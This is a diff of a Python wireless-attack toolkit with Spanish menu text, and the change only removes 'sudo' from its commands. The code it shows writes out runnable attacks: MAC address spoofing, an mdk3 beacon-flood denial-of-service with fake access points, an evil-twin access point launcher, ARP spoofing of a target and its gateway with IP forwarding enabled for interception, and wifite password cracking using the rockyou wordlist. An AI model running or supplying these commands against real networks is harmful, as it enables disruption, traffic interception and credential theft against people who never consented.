@@ -22,13 +22,13 @@ def change_mac(interface, new_mac):
 
     try:
         slowly(f"{WHITE}Bajando interfaz {interface}...{ENDC}")
-        run_command(f"sudo ifconfig {interface} down", check=True)
+        run_command(f"ifconfig {interface} down", check=True)
         
         slowly(f"{WHITE}Cambiando la MAC de {interface} a {new_mac}...{ENDC}")
-        run_command(f"sudo ifconfig {interface} hw ether {new_mac}", check=True)
+        run_command(f"ifconfig {interface} hw ether {new_mac}", check=True)
         
         slowly(f"{WHITE}Subiendo interfaz {interface}...{ENDC}")
-        run_command(f"sudo ifconfig {interface} up", check=True)
+        run_command(f"ifconfig {interface} up", check=True)
         
         print(f"\n{OK}La dirección MAC se cambió a: {new_mac}{ENDC}")
         time.sleep(1)
@@ -156,14 +156,14 @@ def main():
         elif WH == 3:
             os.system("clear")
             print(f"\n{WHITE}Mostrando interfaces de red (Requiere sudo/root)...{ENDC}\n")
-            run_command("sudo ifconfig", check=False)
+            run_command("ifconfig", check=False)
             run_command("ip a", check=False)
             time.sleep(3)
 
         elif WH == 4:
             banner()
             slowly(f" {WHITE}Reiniciando red, por favor, espere...{ENDC}")
-            comando = "sudo service networking restart && sudo systemctl start NetworkManager"
+            comando = "service networking restart && systemctl start NetworkManager"
             run_command(comando, shell=True)
             print(f" {FAIL}Proceso finalizado!{ENDC}")
             time.sleep(2)
@@ -302,12 +302,12 @@ def main():
             
             if crearDic == 'y':
                 print(f"\n{CYAN}[GENERADOR]{ENDC} Ejecutando AP_generator.sh (requiere sudo)...")
-                run_command('sudo bash AP_generator.sh', check=False)
+                run_command('bash AP_generator.sh', check=False)
             
             print(f"\n{WHITE} Ingrese la ruta del diccionario {ENDC}(default: {CYAN}./wordlist/fakeAP.txt{ENDC}): ")
             diccionario = input(f" {OK}>> {WHITE}").strip() or "./wordlist/fakeAP.txt"
 
-            comando = f"sudo mdk3 {interface} b -f {diccionario} -a -s 1000 -c {channel}"
+            comando = f"mdk3 {interface} b -f {diccionario} -a -s 1000 -c {channel}"
             print(f"\n {FAIL}[AVISO] {WHITE}Ataque DoS con MDK3 iniciado. Presione {WHITE}CTRL + C{ENDC} para detener el ataque.")
             time.sleep(2)
             try:
@@ -329,7 +329,7 @@ def main():
 
             if not (ap_interface and internet_interface and essid): continue
             
-            comando = f"sudo ./evil_twin_script.sh {ap_interface} {internet_interface} {essid}"
+            comando = f"./evil_twin_script.sh {ap_interface} {internet_interface} {essid}"
             print(f"\n {FAIL}[AVISO] {WHITE}Iniciando Evil Twin. Presione {WHITE}CTRL + C{ENDC} para detener. Esto abrirá una nueva terminal (xterm).")
             time.sleep(2)
             
@@ -451,10 +451,10 @@ def main():
             if not (interfaz and gateway_ip and target_ip): continue
 
             slowly(f"{CYAN}[PASO 1] {WHITE}Activando IP Forwarding...{ENDC}")
-            run_command("sudo sysctl -w net.ipv4.ip_forward=1", shell=True)
+            run_command("sysctl -w net.ipv4.ip_forward=1", shell=True)
             
-            comando_target = f"xterm -e sudo arpspoof -i {interfaz} -t {target_ip} {gateway_ip}"
-            comando_gateway = f"xterm -e sudo arpspoof -i {interfaz} -t {gateway_ip} {target_ip}"
+            comando_target = f"xterm -e arpspoof -i {interfaz} -t {target_ip} {gateway_ip}"
+            comando_gateway = f"xterm -e arpspoof -i {interfaz} -t {gateway_ip} {target_ip}"
             
             print(f"\n{CYAN}[PASO 2] {WHITE}Lanzando ARP Spoofing al Objetivo y Gateway (En nuevas ventanas xterm)...{ENDC}")
             run_command(comando_target, shell=True, check=False)
@@ -463,7 +463,7 @@ def main():
             slowly(f"\n{OK}ARP Spoofing en progreso. Cierre las ventanas para detener el ataque y presione Enter aquí para volver...{ENDC}")
             input()
             slowly(f"{CYAN}[PASO 3] {WHITE}Desactivando IP Forwarding...{ENDC}")
-            run_command("sudo sysctl -w net.ipv4.ip_forward=0", shell=True)
+            run_command("sysctl -w net.ipv4.ip_forward=0", shell=True)
             time.sleep(2)
 
         # 18. Ejecutar WIFITE
@@ -474,7 +474,7 @@ def main():
             interfaz = input(f" {OK}>> {WHITE}").strip()
             if not interfaz: continue
             
-            comando = f"sudo wifite --kill --dict /usr/share/wordlists/rockyou.txt -i {interfaz}"
+            comando = f"wifite --kill --dict /usr/share/wordlists/rockyou.txt -i {interfaz}"
             print(f"\n {FAIL}[AVISO] {WHITE}Iniciando WIFITE. El ataque se ejecuta automáticamente. Presione {WHITE}CTRL + C{ENDC} para detener.")
             time.sleep(3)
             
